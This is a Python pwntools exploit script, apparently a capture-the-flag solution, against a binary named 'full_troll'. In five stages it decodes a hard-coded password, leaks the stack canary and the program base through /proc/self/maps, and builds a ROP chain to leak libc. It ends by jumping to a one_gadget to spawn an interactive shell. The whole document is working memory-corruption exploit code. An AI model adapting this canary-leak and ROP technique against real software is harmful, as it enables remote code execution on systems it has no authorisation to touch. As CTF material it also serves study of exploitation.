from pwn import *
from one_gadget import generate_one_gadget

def sendpwd(r, cnt):
    r.recv()
    r.sendline(cnt)

r = process("./full_troll", aslr=1)
e = ELF("./full_troll", checksec=False)
l = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
path_to_libc = '/lib/x86_64-linux-gnu/libc.so.6'
ogt = []
for offset in generate_one_gadget(path_to_libc):
    ogt.append(offset)
#gdb.attach(r, "b *$rebase(0xF4A)")

log.info("Stage 1 > Get the password")
op = [0x3F,0xB,0x27,0x33,0x41,0x4F,0x3B,0x1B,0x21,0x32,0x73,0x79,0x2B,0x3A,2,0x38,0x1D,3,4,0x49,0x61,0x58]
password = []
max = len(op) - 1
password.append(op[max])
for i in range(0, len(op)):
    password.append(password[i] ^ op[max-1])
    max -= 1
d = []
for i in range(0, len(password)):
    d.append(chr(password[len(password)-1 -i]))
real_pwd = "".join(d)
real_pwd = real_pwd[1::]
real_pwd = real_pwd[0:14:] + "P" + real_pwd[14::]
log.success("        > password: {}".format(real_pwd))

log.info("Stage 2 > Leaking canary")
pad = "B"*8*4
pload_leak_canary = real_pwd.ljust(0x20, "A") + "C"*8 + pad + 'X'
sendpwd(r, pload_leak_canary)
r.recvuntil(pad)
canary = u64(r.recv(8)) - ord('X')
log.success("        > canary: {}".format(hex(canary)))

log.info("Stage 3 > Leaking program base")
pload_leak_pie = real_pwd.ljust(0x20, "A") + "/proc/self/maps\x00"
sendpwd(r, pload_leak_pie)
p = "0x" + r.recvuntil("-")[:-1:]
e.address = int(p, 16)
puts = e.plt['puts']
got_puts = e.got['puts']
pop_rdi_ret = e.address + 0x10a3 #0x00000000000010a3 : pop rdi ; ret
main = e.address + 0xEAD
log.success("        > program base: {}, puts: {}, puts GOT: {}, pop_rdi_ret gadget: {}, main: {}".format(hex(e.address), hex(puts), hex(got_puts), hex(pop_rdi_ret), hex(main)))

log.info("Stage 4 > Leaking libc base")
sc_leak_libc = p64(pop_rdi_ret) + p64(got_puts) + p64(puts) + p64(main)
pload_leak_libc = real_pwd.ljust(0x20, "A") + "C"*8 + pad + p64(canary) + "D"*8 + sc_leak_libc
sendpwd(r, pload_leak_libc)
pload_trigger_main_return = real_pwd.ljust(0x20, "A") + "\x00"*8
sendpwd(r, pload_trigger_main_return)
r.recvuntil("error")
l.address = u64(r.recvline()[:-1:].ljust(8, "\x00")) - l.symbols["puts"]
log.success("        > libc base: {}, one gadget rce: {}".format(hex(l.address), hex(l.address + ogt[1])))

log.info("Stage 5 > Triggering RCE")
sc_call_system = p64(l.address + ogt[1])
pload_rce = real_pwd.ljust(0x20, "A") + "C"*8 + pad + p64(canary) + "D"*8 + sc_call_system
sendpwd(r, pload_rce)
sendpwd(r, pload_trigger_main_return)

log.success("Pwned!")
r.recv()
r.interactive()
